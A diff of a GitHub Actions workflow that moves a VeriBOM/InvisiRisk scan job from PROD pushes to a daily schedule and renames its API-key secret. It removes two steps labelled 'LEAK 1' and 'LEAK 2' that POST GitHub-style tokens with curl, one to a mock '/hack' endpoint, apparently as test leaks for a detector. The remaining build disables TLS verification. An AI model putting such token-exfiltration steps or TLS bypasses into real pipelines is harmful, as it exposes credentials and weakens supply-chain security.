@@ -1,9 +1,7 @@
-name: Build Maven Package For Secrets
+name: Build PyPi Package For daily build
 on:
-  push:
-    branches: [ PROD ]
-  pull_request:
-    branches: [ PROD ]
+  schedule:
+    - cron: '15 2 * * *'  # Runs every day at 08:00 AM Nepal Time
 
 permissions:
   checks: write
@@ -24,7 +22,7 @@ jobs:
         with:
           url: '${{env.API_URL}}/utilityapi/v1/scan'
           method: 'POST'
-          data: '{"api_key": "${{secrets.VB_API_KEY_PROD}}"}'
+          data: '{"api_key": "${{secrets.VB_API_KEY_DAILY}}"}'
       - name: Parse Response
         id: parseResponse
         run: echo "scan_id=${{fromJSON(steps.createScan.outputs.response).data.scan_id}}" >> "$GITHUB_OUTPUT"
@@ -40,7 +38,7 @@ jobs:
         id: fetchECRDetails
         uses: fjogeleit/http-request-action@v1.15.1
         with:
-            url: '${{env.API_URL}}/utilityapi/v1/registry?api_key=${{secrets.VB_API_KEY_PROD}}'
+            url: '${{env.API_URL}}/utilityapi/v1/registry?api_key=${{secrets.VB_API_KEY_DAILY}}'
             method: 'GET'
       - name: Decoding VB Token
         id: parseToken
@@ -65,7 +63,7 @@ jobs:
         env:
           PSE_DEBUG_FLAG: --alsologtostderr
           POLICY_LOG: t
-          INVISIRISK_JWT_TOKEN: ${{secrets.VB_API_KEY_PROD}}
+          INVISIRISK_JWT_TOKEN: ${{secrets.VB_API_KEY_DAILY}}
           INVISIRISK_PORTAL: https://app.veribom.com
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} 
     container:
@@ -93,18 +91,6 @@ jobs:
       uses: actions/setup-node@v3
       with:
         node-version: ${{ matrix.node-version }}
-
-    - name: Send POST request with GitHub token (LEAK 1)
-      run: |
-          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
-            -H "Content-Type: application/json" \
-            -d '{
-            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-          }'
-    - name: Make API Request (LEAK 2)
-      run: |
-        curl -k -X POST https://api.github.com/endpoint \
-        -d '{"name": "ghp_1234567890abcdef1234567890abcdef12345678", "description": "A description of my repository"}'
         
     - name: install dependencies
       run: mvn clean install -Dmaven.wagon.http.ssl.insecure=true -Dmaven.wagon.http.ssl.allowall=true -fae -DskipTests
